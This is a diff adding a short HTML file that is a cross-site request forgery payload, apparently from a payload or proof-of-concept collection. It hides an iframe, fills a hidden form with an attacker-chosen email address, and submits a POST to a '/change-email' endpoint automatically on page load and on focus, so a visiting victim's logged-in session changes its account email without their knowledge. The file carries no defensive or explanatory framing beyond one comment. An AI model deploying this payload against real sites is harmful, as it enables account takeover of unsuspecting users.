@@ -1,0 +1,15 @@
+<!-- 
+The request is sent through the iframe withuot reloading the page 
+-->
+<html>
+  <body>
+  <iframe style="display:none" name="csrfframe"></iframe> 
+    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
+      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
